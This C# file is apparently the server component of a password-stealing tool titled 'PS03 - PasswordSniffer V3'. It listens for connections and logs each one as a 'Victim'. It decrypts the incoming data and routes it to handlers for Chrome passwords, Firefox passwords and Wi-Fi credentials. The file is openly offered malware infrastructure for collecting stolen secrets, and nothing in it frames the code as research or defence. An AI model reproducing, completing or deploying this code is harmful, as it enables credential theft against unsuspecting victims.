using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using ConsoleApplication1;

namespace PS03_Server
{
    class Program
    {
        static ChromeHandler chromehandler = new ChromeHandler();
        static WifiHandler wifihandler = new WifiHandler();
        static FirefoxHandler firefoxhandler = new FirefoxHandler();


        static void Main(string[] args)
        {
            string data = " ============== PS03 - PasswordSniffer V3 ============== ";
            string under = "=========================";
            string quote = "\"Passwords are like underwear; you don’t let people see it, you should change it very often, and you shouldn’t share it with strangers\" – Chris Pirill";

            Console.ForegroundColor = ConsoleColor.White;
            Console.SetCursorPosition((Console.WindowWidth - data.Length) / 2, Console.CursorTop);
            Console.WriteLine(data);
            Console.SetCursorPosition((Console.WindowWidth - under.Length) / 2, Console.CursorTop);
            Console.WriteLine(under);
            Console.WriteLine();
            Console.SetCursorPosition((Console.WindowWidth - 80) / 2, Console.CursorTop);
            Console.WriteLine(quote);
            Console.WriteLine();
            Console.WriteLine();

            Console.ResetColor();       



            Go();
        }

        private static void ReceivedData(string data)
        {
           
            var dec = new SimpleAES();
            string unencrypted = dec.DecryptString(data);
            if (unencrypted.StartsWith("CHROME:"))
                chromehandler.Handle(unencrypted);
            else if(unencrypted.StartsWith("FIREFOX:"))
                firefoxhandler.Handle(unencrypted);
            else if (unencrypted.StartsWith("WIFI:"))
                wifihandler.Handle(unencrypted);

        }

        private static void ClientConnected(string client)
        {
            string data = "Victim connected from: " + client;
            Console.ForegroundColor = ConsoleColor.White;
            Console.SetCursorPosition((Console.WindowWidth - data.Length) / 2, Console.CursorTop);
            Console.WriteLine(data);
        }



        private static void Go()
        {
            var listener = new Listener();
            listener.OnVictimConnected += ClientConnected;
            listener.OnOutputReady += ReceivedData;
            listener.start();
        }
    }
}
